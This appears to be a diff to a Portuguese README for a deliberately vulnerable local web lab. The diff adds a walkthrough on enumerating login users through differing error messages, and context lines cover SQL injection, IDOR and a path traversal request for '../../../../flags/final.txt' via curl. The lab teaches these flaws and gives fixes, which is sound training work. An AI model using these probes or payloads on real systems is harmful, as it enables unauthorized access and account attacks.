@@ -11,6 +11,8 @@ As quatro vulnerabilidades principais sao:
 - credencial vazada em arquivo publico
 - Path Traversal / LFI controlado
 
+O lab tambem ensina enumeracao de usuarios por mensagens de erro diferentes no login. Essa falha nao possui flag propria.
+
 `robots.txt`, `/status`, comentario HTML, `/backup` e `/download` funcionam como pistas de enumeracao e validacao de impacto.
 
 ## 1. Preparacao do ambiente
@@ -189,7 +191,43 @@ Correcao:
 
 ## 7. SQL Injection no login
 
-A rota de login usa MySQL. Primeiro valide comportamento normal:
+A rota de login usa MySQL e tambem vaza diferenca entre usuario inexistente e senha incorreta.
+
+Valide a enumeracao de usuario inexistente:
+
+```bash
+curl -i -X POST http://localhost:8088/login \
+  -d "username=naoexiste" \
+  -d "password=teste"
+```
+
+Mensagem esperada:
+
+```text
+Usuario nao encontrado.
+```
+
+Agora valide usuario existente com senha incorreta:
+
+```bash
+curl -i -X POST http://localhost:8088/login \
+  -d "username=joao" \
+  -d "password=errada"
+```
+
+Mensagem esperada:
+
+```text
+Senha invalida.
+```
+
+Raciocinio: mensagens diferentes permitem descobrir quais usuarios existem antes de tentar outras tecnicas de autenticacao.
+
+Impacto: um atacante pode reduzir tentativa e erro, montar lista de usuarios validos e combinar isso com senha fraca, phishing ou outros bugs.
+
+No lab, essa enumeracao e intencional. Em sistemas reais, a correcao e retornar uma mensagem uniforme para falhas de login.
+
+Depois valide comportamento normal:
 
 ```bash
 curl -i -c joao.cookies \
@@ -209,6 +247,12 @@ Agora valide falha de login:
 curl -i \
   -d "username=admin&password=senha_errada" \
   http://localhost:8088/login
+```
+
+Como `admin` existe, a mensagem esperada e:
+
+```text
+Senha invalida.
 ```
 
 O ponto vulneravel e a concatenacao direta de `username` e `password` na query SQL.
@@ -341,9 +385,10 @@ Correcao:
 5. Descobrir `/status`, `/dev.txt`, `/backup` e `/download`
 6. Acessar `/dev.txt` e encontrar credencial exposta
 7. Usar credencial no `/backup`
-8. Explorar login com SQL Injection
-9. Acessar contas e explorar IDOR
-10. Explorar `/download?file=` com path traversal
+8. Enumerar usuarios por mensagens diferentes no login
+9. Explorar login com SQL Injection
+10. Acessar contas e explorar IDOR
+11. Explorar `/download?file=` com path traversal
 
 ## 11. Validacao rapida
 
@@ -354,6 +399,8 @@ curl -i http://localhost:8088
 curl -i http://localhost:8088/status
 curl -i http://localhost:8088/robots.txt
 curl -i http://localhost:8088/dev.txt
+curl -i -X POST http://localhost:8088/login -d "username=naoexiste" -d "password=teste"
+curl -i -X POST http://localhost:8088/login -d "username=joao" -d "password=errada"
 curl -i "http://localhost:8088/download?file=public-info.txt"
 curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
 ```
